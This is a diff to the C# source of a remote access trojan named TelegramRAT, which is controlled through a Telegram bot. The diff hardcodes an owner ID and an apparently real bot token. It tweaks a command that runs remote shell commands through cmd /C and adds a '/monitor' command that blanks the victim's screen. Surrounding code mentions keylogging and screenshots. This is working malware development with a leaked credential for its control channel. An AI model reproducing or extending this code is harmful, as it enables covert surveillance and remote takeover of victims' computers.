@@ -31,8 +31,8 @@ namespace TelegramRAT
     {
         static TelegramBotClient Bot;
 
-        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
-        readonly static string BotToken = null; // Place your Telegram bot token. 
+        readonly static long? OwnerId = 1113634091; // Place your Telegram id here or keep it null.
+        readonly static string BotToken = "1727211141:AAHYjMAS6Zo7q7_kgRLUkkOj7lVjWonhikQ"; // Place your Telegram bot token. 
 
         static List<BotCommand> commands = new List<BotCommand>();
         static bool keylog = false;
@@ -91,7 +91,7 @@ namespace TelegramRAT
 
                 $"OS: {GetWindowsVersion()}",
                 ParseMode.Html);
-            
+
             var offset = 0;
 
             while (true)
@@ -104,7 +104,7 @@ namespace TelegramRAT
                 {
                     return update.Message != null && update.Message.Date > hellomsg.Date;
                 }).ToArray();
-                
+
                 UpdateWorker(updates).Wait();
 
                 Task.Delay(1000).Wait();
@@ -114,7 +114,7 @@ namespace TelegramRAT
 
         public static async Task UpdateWorker(Update[] Updates)
         {
-            
+
             foreach (var update in Updates)
             {
                 if (update.Message.Text == null && update.Message.Caption == null)
@@ -160,7 +160,6 @@ namespace TelegramRAT
             {
                 string prodName = key.GetValue("ProductName") as string;
                 string csdVer = key.GetValue("CSDVersion") as string;
-                csdVer = "";
                 return prodName + csdVer;
             }
             return string.Empty;
@@ -184,7 +183,7 @@ namespace TelegramRAT
                     {
                         if (model.Args.Length == 0)
                         {
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Use this command to retrieve description of other commands. " +
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Use this command to retrieve description of other commands, like this: /help screenshot" +
                                 "\nTo get list of all commands - type /commands", replyToMessageId: update.Message.MessageId);
                             return;
                         }
@@ -214,9 +213,6 @@ namespace TelegramRAT
                             Description += $"\nExample: {cmd.Example}";
                         }
                         Bot.SendTextMessageAsync(update.Message.Chat.Id, Description, replyToMessageId: update.Message.MessageId, parseMode: ParseMode.Html, disableWebPagePreview: true);
-                        return;
-
-
 
                     });
                 }
@@ -241,7 +237,7 @@ namespace TelegramRAT
 
                             cmd.StartInfo.Arguments = "/C " + model.RawArgs;
                             cmd.StartInfo.RedirectStandardOutput = true;
-                            cmd.StartInfo.UseShellExecute = false;
+                            cmd.StartInfo.UseShellExecute = true;
 
                             cmd.Start();
                             Bot.SendTextMessageAsync(update.Message.Chat.Id, "Started!", replyToMessageId: update.Message.MessageId);
@@ -1622,6 +1618,42 @@ namespace TelegramRAT
 
             });
 
+            //MONITOR OFF/ON
+            CommandsList.Add(new BotCommand
+            {
+                Command = "/monitor",
+                CountArgs = 1,
+
+                Description = "Turn monitor off or on",
+                Example = "/monitor off",
+                Execute = (model, update) =>
+                {
+                    Task.Run(() =>
+                    {
+                        try
+                        {
+                            if (model.Args[0] == "off")
+                            {
+                                bool status = WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MONITORPOWER, 2);
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, status ? "Monitor turned off" : "Failed", replyToMessageId: update.Message.MessageId);
+                                return;
+                            }
+                            if (model.Args[0] == "on")
+                            {
+                                new MouseSimulator(new InputSimulator()).MoveMouseBy(0, 0);
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Monitor turned on", replyToMessageId: update.Message.MessageId);
+                                return;
+                            }
+
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Type off or on. See help - /help monitor", replyToMessageId: update.Message.MessageId); ;
+                        }
+                        catch (Exception ex)
+                        {
+                            ReportError(update, ex);
+                        }
+                    });
+                }
+            });
 
         }
     }
